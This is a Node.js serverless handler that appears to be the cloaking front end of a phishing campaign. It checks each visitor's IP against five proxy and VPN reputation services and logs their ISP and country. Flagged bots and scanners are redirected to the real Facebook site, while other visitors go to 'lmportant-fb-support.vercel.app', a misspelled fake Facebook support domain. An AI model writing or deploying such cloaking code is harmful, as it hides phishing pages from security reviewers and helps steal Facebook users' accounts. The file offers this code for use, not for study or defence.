import { MongoClient } from "mongodb";
import fetch from "node-fetch";

// const uri = process.env.MONGODB_URI;
let clientPromise = null;

async function connectDB() {
  // if (!clientPromise) {
  //   const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });
  //   clientPromise = client.connect();
  // }
  // return clientPromise;
}

export default async function handler(req, res) {
  // const dbClient = await connectDB();
  // const db = dbClient.db("visitorLogs");
  // const logsCollection = db.collection("logs");
  // const cacheCollection = db.collection("cache");
  
  const ip = getRealIp(req);
  // console.log(req,'req');

  // Check cache (valid for 1 hour)
  // const cached = await cacheCollection.findOne({ ip });
  // let isBad;
  // if (cached && Date.now() - cached.timestamp < 3600 * 1000) {
  //   isBad = cached.isBad;
  // } else {
    console.log(ip, 'ipp');
    
    const isBad = await isBot(ip);
    console.log(ip, ' - ', 'timestamp: ', new Date(), ':: isBot: - ', isBad);
    
    // await cacheCollection.updateOne(
    //   { ip },
    //   { $set: { ip, isBad, timestamp: Date.now() } },
    //   { upsert: true }
    // );
  // }

  // Get ISP & Country
  const ipInfo = await fetch(`https://ipinfo.io/${ip}/json`).then(r => r.json()).catch(() => ({}));
  const isp = ipInfo.org || "Unknown";
  const country = ipInfo.country || "Unknown";

  // Log into DB
  // await logsCollection.insertOne({
  //   ip,
  //   isp,
  //   type: isBad ? "bot" : "human",
  //   country,
  //   timestamp: new Date()
  // });
  console.log(ip, ' - ', 'isp: ', isp, ' - country:  - ',country, ' -- timestamp: ', new Date(), ':: isBot: - ', isBad);

  // Redirect
  if (isBad) {
    return res.redirect(302, "https://www.facebook.com");
  } else {
    return res.redirect(302, "https://lmportant-fb-support.vercel.app/");
  }
}

// function getRealIp(req) {
//   const headers = req.headers;
//   const ipHeaders = [
//     "x-client-ip",
//     "x-forwarded-for",
//     "x-forwarded",
//     "x-cluster-client-ip",
//     "forwarded-for",
//     "forwarded",
//   ];
//   for (let h of ipHeaders) {
//     const val = headers[h];
//     console.log(val,'val');
    
//     if (val && isPublicIp(val)) {
//       return val.split(",")[0].trim();
//     }
//   }
//   return req.socket.remoteAddress?.replace("::ffff:", "");
// }

// function isPublicIp(ip) {
//   if (
//     ip === "127.0.0.1" ||
//     ip === "::1" ||
//     ip.startsWith("::ffff:127.")
//   ) {
//     return true;
//   }
//   return !/^10\.|^172\.(1[6-9]|2\d|3[0-1])|^192\.168/.test(ip);
// }

// Replace your getRealIp / isPublicIp with this robust version:

/**
 * Return the "best" client IP for the incoming request.
 * - extracts from common headers (x-forwarded-for, x-real-ip, etc.)
 * - normalizes IPv4/IPv6 forms (handles ::ffff:127.0.0.1)
 * - in development (or when ALLOW_PRIVATE_IPS=1) will return private/localhost IPs for testing
 */
function getRealIp(req) {
  const headerCandidates = [
    "x-client-ip",
    "x-forwarded-for",
    "x-real-ip",
    "cf-connecting-ip",
    "fastly-client-ip",
    "true-client-ip",
    "x-forwarded",
    "x-cluster-client-ip",
    "forwarded-for",
    "forwarded",
  ];

  // Option to allow private/local IPs in dev/testing (set ALLOW_PRIVATE_IPS=1 in .env)
  const allowPrivate = process.env.ALLOW_PRIVATE_IPS === "1" || process.env.NODE_ENV !== "production";

  // Try headers first
  for (const h of headerCandidates) {
    const raw = req.headers[h];
    if (!raw) continue;
    // helpful debug:
    console.log(`[getRealIp] header ${h}:`, raw);

    const ip = extractIpFromHeader(raw);
    if (!ip) continue;

    if (allowPrivate) return ip;                 // allow localhost/private in dev
    if (!isPrivateIp(ip)) return ip;             // only return public IP in prod
    // if private and not allowed, continue searching other headers
  }

  // Fallback to socket remote address
  const socketAddr = req.socket?.remoteAddress || req.connection?.remoteAddress || null;
  console.log("[getRealIp] socketAddr:", socketAddr);
  const normalizedSocketIp = normalizeSocketIp(socketAddr);
  if (normalizedSocketIp) {
    if (allowPrivate) return normalizedSocketIp;
    if (!isPrivateIp(normalizedSocketIp)) return normalizedSocketIp;
  }

  // Last-resort: return null or a default in dev
  if (allowPrivate) return "127.0.0.1";
  return null;
}

function extractIpFromHeader(raw) {
  if (!raw) return null;
  // x-forwarded-for can be a list: take the first non-empty token
  const first = raw.split(",").map(s => s.trim()).find(Boolean);
  if (!first) return null;

  let ip = first;

  // Remove surrounding [] if present (e.g. [::1]:3000)
  ip = ip.replace(/^\[|\]$/g, "");

  // If IPv4 with port like 1.2.3.4:1234 => keep only IP
  const ipv4WithPort = ip.match(/^(\d+\.\d+\.\d+\.\d+):\d+$/);
  if (ipv4WithPort) return ipv4WithPort[1];

  // If it ends with :<port> but candidate contains ":" (likely IPv6 with port),
  // try to strip trailing :port only when there's an obvious port
  const maybePort = ip.match(/^(.+):(\d+)$/);
  if (maybePort) {
    const candidate = maybePort[1];
    if (candidate.includes(":")) ip = candidate; // treat as IPv6
  }

  // IPv4-mapped IPv6: ::ffff:127.0.0.1 -> make it 127.0.0.1
  if (/^::ffff:/i.test(ip)) ip = ip.replace(/^::ffff:/i, "");

  // Remove zone index like %eth0 (fe80::1%eth0)
  ip = ip.split("%")[0];

  return ip;
}

function normalizeSocketIp(addr) {
  if (!addr) return null;
  let ip = addr;
  // Sometimes remoteAddress is "::ffff:127.0.0.1"
  if (ip.startsWith("::ffff:")) ip = ip.replace("::ffff:", "");
  // Remove zone if present
  ip = ip.split("%")[0];
  return ip;
}

function isPrivateIp(ip) {
  if (!ip) return true;

  // exact loopback checks
  if (ip === "127.0.0.1" || ip === "::1") return true;

  // IPv4 check
  if (/^\d+\.\d+\.\d+\.\d+$/.test(ip)) {
    if (/^10\./.test(ip)) return true;
    if (/^192\.168\./.test(ip)) return true;
    if (/^172\.(1[6-9]|2\d|3[0-1])\./.test(ip)) return true; // 172.16.0.0 - 172.31.255.255
    if (/^169\.254\./.test(ip)) return true; // link-local
    return false; // publicly routable IPv4
  }

  // IPv6 checks (unique-local and link-local)
  if (/^(?:fc|fd)/i.test(ip)) return true; // fc00::/7 unique local
  if (/^fe80:/i.test(ip)) return true;     // link-local
  if (ip === "::") return true;

  // Otherwise treat as public (conservative)
  return false;
}

async function isBot(ip) {
  const results = await Promise.all([proxy1(ip), proxy2(ip), proxy3(ip), proxy4(ip), proxy5(ip)]);
  return results.includes("BLOCK");
}

async function proxy1(ip) {
  try {
    const res = await fetch(`https://blackbox.ipinfo.app/lookup/${ip}`);
    const text = await res.text();
    return text === "Y" ? "BLOCK" : "ALLOW";
  } catch {
    return "ALLOW";
  }
}

async function proxy2(ip) {
  try {
    const res = await fetch(
      `http://check.getipintel.net/check.php?ip=${ip}&contact=test${Math.floor(
        Math.random() * 1000000
      )}@domain.com`
    );
    const text = await res.text();
    const num = parseFloat(text);
    return !isNaN(num) && num >= 0.99 ? "BLOCK" : "ALLOW";
  } catch {
    return "ALLOW";
  }
}

async function proxy3(ip) {
  try {
    const res = await fetch(`https://ip.teoh.io/api/vpn/${ip}`);
    const json = await res.json();
    return json.risk === "high" ? "BLOCK" : "ALLOW";
  } catch {
    return "ALLOW";
  }
}

async function proxy4(ip) {
  try {
    const res = await fetch(`http://proxycheck.io/v2/${ip}?risk=1&vpn=1`);
    const json = await res.json();
    return json.status === "ok" && json[ip]?.proxy === "yes" ? "BLOCK" : "ALLOW";
  } catch {
    return "ALLOW";
  }
}

async function proxy5(ip) {
  try {
    const res = await fetch(`https://v2.api.iphub.info/guest/ip/${ip}?c=${Math.random()}`);
    const json = await res.json();
    return json.block === 1 ? "BLOCK" : "ALLOW";
  } catch {
    return "ALLOW";
  }
}
